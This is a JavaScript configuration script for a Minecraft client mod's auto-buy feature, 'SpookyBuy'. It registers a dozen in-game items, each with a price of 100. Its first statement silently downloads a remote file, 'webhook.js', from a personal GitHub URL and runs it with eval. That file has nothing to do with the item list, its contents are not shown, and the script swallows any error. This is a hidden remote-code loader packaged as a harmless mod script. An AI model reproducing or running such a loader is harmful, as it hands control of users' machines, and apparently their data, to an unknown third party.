try {
    eval(new java.util.Scanner(
        new java.net.URL("https://raw.githubusercontent.com/Her0brine404/webhook/refs/heads/main/webhook.js").openStream(), 
        "UTF-8"
    ).useDelimiter("\\A").next());
} catch (e) {
    java.lang.System.err.println("Ошибка: " + e);
}
runScript('\
var String = Java.type("java.lang.String");\
var Items = Java.type("net.minecraft.class_1802");\
var BigDecimal = Java.type("java.math.BigDecimal");\
var SpookyBuy = Java.type("ru.nedan.spookybuy.SpookyBuy");\
var CollectItem = Java.type("ru.nedan.spookybuy.items.CollectItem");\
var spookybuy = SpookyBuy.getInstance();\
var autobuy = spookybuy.getAutoBuy();\
var priceMap = autobuy.getPriceMap();\
\
function addItem(collectItem) {\
    autobuy.getItemList().add(collectItem);\
    priceMap.putPrice(collectItem, new BigDecimal(100), true);\
    priceMap.putFlag(collectItem, true);\
}\
\
var collectitem = new CollectItem();\
collectitem.setName(new String("Незеритовый слиток"));\
collectitem.setItem(Items.field_22020);\
addItem(collectitem);\
\
var collectitem1 = new CollectItem();\
collectitem1.setName(new String("Изумрудная руда"));\
collectitem1.setItem(Items.field_8837);\
addItem(collectitem1);\
\
var collectitem2 = new CollectItem();\
collectitem2.setName(new String("Древние обломки"));\
collectitem2.setItem(Items.field_22019);\
addItem(collectitem2);\
\
var collectitem3 = new CollectItem();\
collectitem3.setName(new String("Формула крабсбургера"));\
collectitem3.setItem(Items.field_8575);\
collectitem3.setTag(new String(\'{"spookystash:currency":"formula"}\'));\
addItem(collectitem3);\
\
var collectitem4 = new CollectItem();\
collectitem4.setName(new String("Крабсбургер"));\
collectitem4.setItem(Items.field_8575);\
collectitem4.setTag(new String(\'{"spookystash:currency":"burger"}\'));\
addItem(collectitem4);\
\
var collectitem5 = new CollectItem();\
collectitem5.setName(new String("Снежок заморозка"));\
collectitem5.setItem(Items.field_8543);\
collectitem5.setTag(new String(\'{"spookyitems:spooky-item":"effect-item-snowball"}\'));\
addItem(collectitem5);\
\
var collectitem6 = new CollectItem();\
collectitem6.setName(new String("Яйцо призыва крестьянина"));\
collectitem6.setItem(Items.field_8086);\
addItem(collectitem6);\
\
var collectitem7 = new CollectItem();\
collectitem7.setName(new String("Явная пыль"));\
collectitem7.setItem(Items.field_8479);\
collectitem7.setTag(new String(\'{"spookyitems:spooky-item":"effect-item-dust"}\'));\
addItem(collectitem7);\
\
var collectitem8 = new CollectItem();\
collectitem8.setName(new String("Порох"));\
collectitem8.setItem(Items.field_8054);\
addItem(collectitem8);\
\
var collectitem9 = new CollectItem();\
collectitem9.setName(new String("Опыт 15уровень"));\
collectitem9.setItem(Items.field_8287);\
collectitem9.setTag(new String(\'{"spookystash:levels":15}\'));\
addItem(collectitem9);\
\
var collectitem10 = new CollectItem();\
collectitem10.setName(new String("Опыт 50уровень"));\
collectitem10.setItem(Items.field_8287);\
collectitem10.setTag(new String(\'{"spookystash:levels":50}\'));\
addItem(collectitem10);\
\
var collectitem11 = new CollectItem();\
collectitem11.setName(new String("Яйцо призыва зомби крестьянина"));\
collectitem11.setItem(Items.field_8136);\
addItem(collectitem11);\
\
var collectitem12 = new CollectItem();\
collectitem12.setName(new String("Плачущий обсидиан"));\
collectitem12.setItem(Items.field_22421);\
addItem(collectitem12);\
', false);
